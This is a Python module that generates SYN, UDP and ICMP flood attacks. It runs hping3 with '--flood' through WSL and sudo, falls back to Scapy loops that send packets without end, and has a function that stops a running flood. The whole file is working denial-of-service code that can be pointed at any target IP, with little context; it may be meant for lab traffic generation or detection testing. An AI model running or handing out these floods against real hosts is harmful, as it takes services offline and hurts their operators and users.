"""
SYN, UDP, and ICMP flood attack generator via WSL hping3 or local Scapy fallback.
"""
import subprocess
import sys
import time
from typing import Optional


def syn_flood(
    target_ip: str,
    target_port: int = 80,
    duration: int = 30,
    rate: int = 100,
) -> subprocess.Popen:
    """
    Launch SYN flood via WSL hping3.
    Command: wsl -e sudo hping3 -S -p {port} --flood -c {rate*duration} {target_ip}
    """
    count = max(1, rate * duration)
    cmd = [
        "wsl", "-e", "sudo", "hping3",
        "-S", "-p", str(target_port),
        "--flood", "-c", str(count),
        target_ip,
    ]
    print(f"[ATTACK] Launching SYN Flood on {target_ip}:{target_port} for {duration}s...")
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return proc
    except Exception as e:
        print(f"[ATTACK] WSL launch failed ({e}), falling back to Scapy background simulation...")
        fallback_cmd = [
            sys.executable, "-c",
            f"import time; from scapy.all import IP, TCP, send; "
            f"end = time.time() + {duration}; "
            f"pkt = IP(dst='{target_ip}')/TCP(dport={target_port}, flags='S'); "
            f"print('Sending Scapy SYN packets...'); "
            f"send(pkt, loop=1, inter=0.01, verbose=0)"
        ]
        return subprocess.Popen(fallback_cmd)


def udp_flood(
    target_ip: str,
    target_port: int = 53,
    duration: int = 30,
    packet_size: int = 512,
) -> subprocess.Popen:
    """
    Launch UDP flood via WSL hping3.
    Command: wsl -e sudo hping3 --udp -p {port} --flood -d {packet_size} {target_ip}
    """
    cmd = [
        "wsl", "-e", "sudo", "hping3",
        "--udp", "-p", str(target_port),
        "--flood", "-d", str(packet_size),
        target_ip,
    ]
    print(f"[ATTACK] Launching UDP Flood on {target_ip}:{target_port} for {duration}s...")
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return proc
    except Exception:
        fallback_cmd = [
            sys.executable, "-c",
            f"import time; from scapy.all import IP, UDP, Raw, send; "
            f"pkt = IP(dst='{target_ip}')/UDP(dport={target_port})/Raw(b'X'*{packet_size}); "
            f"send(pkt, loop=1, inter=0.01, verbose=0)"
        ]
        return subprocess.Popen(fallback_cmd)


def icmp_flood(
    target_ip: str,
    duration: int = 30,
    packet_size: int = 1024,
) -> subprocess.Popen:
    """
    Launch ICMP Ping Flood via WSL hping3.
    Command: wsl -e sudo hping3 --icmp --flood -d {packet_size} {target_ip}
    """
    cmd = [
        "wsl", "-e", "sudo", "hping3",
        "--icmp", "--flood",
        "-d", str(packet_size),
        target_ip,
    ]
    print(f"[ATTACK] Launching ICMP Flood on {target_ip} for {duration}s...")
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return proc
    except Exception:
        fallback_cmd = [
            sys.executable, "-c",
            f"import time; from scapy.all import IP, ICMP, Raw, send; "
            f"pkt = IP(dst='{target_ip}')/ICMP()/Raw(b'P'*{packet_size}); "
            f"send(pkt, loop=1, inter=0.01, verbose=0)"
        ]
        return subprocess.Popen(fallback_cmd)


def stop_flood(proc: subprocess.Popen) -> None:
    """Terminate the flood attack process cleanly."""
    if proc and proc.poll() is None:
        try:
            proc.terminate()
            proc.wait(timeout=2.0)
        except Exception:
            proc.kill()
        print("[ATTACK] Flood process stopped.")
